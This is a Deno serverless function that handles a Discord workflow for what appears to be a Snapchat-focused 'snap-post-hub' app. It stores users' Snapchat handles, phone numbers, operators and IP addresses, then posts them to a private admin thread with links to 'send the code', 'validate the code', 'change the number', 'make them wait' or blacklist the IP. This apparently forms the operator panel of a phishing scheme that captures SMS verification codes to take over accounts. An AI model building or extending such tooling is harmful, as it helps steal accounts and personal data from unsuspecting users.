import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const DISCORD_CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { submissionId } = await req.json();

    if (!submissionId) {
      return Response.json({ error: 'submissionId requis' }, { status: 400 });
    }

    // Get submission with discord_message_id
    const submission = await base44.asServiceRole.entities.Submission.get(submissionId);
    if (!submission || !submission.discord_message_id) {
      return Response.json({ claimed: false });
    }

    const messageId = submission.discord_message_id;

    // Check reactions on the message
    const reactionsRes = await fetch(
      `https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages/${messageId}/reactions/%E2%9C%85`,
      {
        headers: { "Authorization": `Bot ${DISCORD_BOT_TOKEN}` }
      }
    );

    if (!reactionsRes.ok) {
      console.error(`Discord reactions fetch error: ${reactionsRes.status}`);
      return Response.json({ claimed: false });
    }

    const reactions = await reactionsRes.json();
    if (!reactions || reactions.length === 0) {
      return Response.json({ claimed: false });
    }

    // Get first reactor (admin who claimed)
    const adminId = reactions[0].id;

    // Thread already created?
    if (submission.discord_thread_id) {
      return Response.json({ claimed: true, threadId: submission.discord_thread_id });
    }

    // Create private thread
    const threadRes = await fetch(
      `https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/threads`,
      {
        method: "POST",
        headers: {
          "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          name: `✅ Prise en charge — @${submission.snapchat}`,
          type: 12, // GUILD_PRIVATE_THREAD
          auto_archive_duration: 1440
        })
      }
    );

    if (!threadRes.ok) {
      const error = await threadRes.text();
      console.error(`Discord thread creation error: ${error}`);
      return Response.json({ claimed: false, error });
    }

    const threadData = await threadRes.json();
    const threadId = threadData.id;

    // Add admin to thread
    const addMemberRes = await fetch(
      `https://discord.com/api/v10/channels/${threadId}/thread-members/${adminId}`,
      {
        method: "PUT",
        headers: { "Authorization": `Bot ${DISCORD_BOT_TOKEN}` }
      }
    );

    if (!addMemberRes.ok) {
      console.error(`Add member error: ${addMemberRes.status}`);
    }

    // Send submission details in thread
    const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
    const now = new Date();
    const dateStr = now.toLocaleDateString("fr-FR", {
      weekday: "long", day: "numeric", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
    const codeUrl = `${appUrl}/?triggerAction=send_code&id=${submissionId}`;
    const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
    const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
    const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(submission.ip_address)}`;

    const threadEmbed = {
      title: "✅ Tu as pris en charge cette soumission",
      color: 0x2ECC71,
      fields: [
        { name: "👻 Utilisateur", value: `@${submission.snapchat}`, inline: true },
        { name: "📡 Opérateur", value: submission.operateur, inline: true },
        { name: "📞 Numéro", value: formatPhone(submission.telephone), inline: true },
        { name: "🔧 Envoyer le code", value: `[Cliquer ici pour envoyer le code](${codeUrl})`, inline: false },
      ],
      footer: { text: `ID: ${submissionId || "N/A"}` },
      timestamp: now.toISOString()
    };

    const messageRes = await fetch(
      `https://discord.com/api/v10/channels/${threadId}/messages`,
      {
        method: "POST",
        headers: {
          "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `<@${adminId}> tu as été le premier à réagir ✅`,
          embeds: [threadEmbed]
        })
      }
    );

    // Send submission details with actions
    if (messageRes.ok) {
      const actionsEmbed = {
        title: "⚡ Actions",
        color: 0x3498DB,
        fields: [
          { name: "✅ Valider le code", value: `[Cliquer ici](${codeUrl})`, inline: false },
          { name: "❌ Changer le numéro", value: `[Cliquer ici](${wrongUrl})`, inline: false },
          { name: "⏳ Faire patienter", value: `[Cliquer ici](${waitUrl})`, inline: false },
          { name: "🚫 Blacklist instant", value: `[Cliquer ici](${blacklistUrl})`, inline: false },
        ]
      };

      await fetch(
        `https://discord.com/api/v10/channels/${threadId}/messages`,
        {
          method: "POST",
          headers: {
            "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ embeds: [actionsEmbed] })
        }
      );
    }

    if (!messageRes.ok) {
      console.error(`Message send error: ${messageRes.status}`);
    }

    // Update submission with thread_id and admin_id
    await base44.asServiceRole.entities.Submission.update(submissionId, {
      discord_thread_id: threadId,
      discord_admin_id: adminId
    });

    return Response.json({ claimed: true, threadId });
  } catch (error) {
    console.error("checkDiscordReaction error:", error.message);
    return Response.json({ error: error.message }, { status: 500 });
  }
});